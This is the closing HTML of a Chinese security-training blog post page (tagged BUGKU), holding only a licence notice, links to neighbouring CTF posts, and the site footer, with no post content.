      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/BUGKU/" rel="tag"># BUGKU</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/11/22/%E7%8E%84%E6%9C%BA%E7%AC%AC3%E7%AB%A0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E5%B7%B2%E5%81%9A%E5%AE%8C)/" rel="prev" title="玄机第三章权限维持">
                  <i class="fa fa-angle-left"></i> 玄机第三章权限维持
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/11/30/web%E5%85%A5%E9%97%A8SSRF%E7%AF%87--ctfshow/" rel="next" title="web入门SSRF篇--ctfshow">
                  web入门SSRF篇--ctfshow <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2024 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">3.3m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">50:05</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
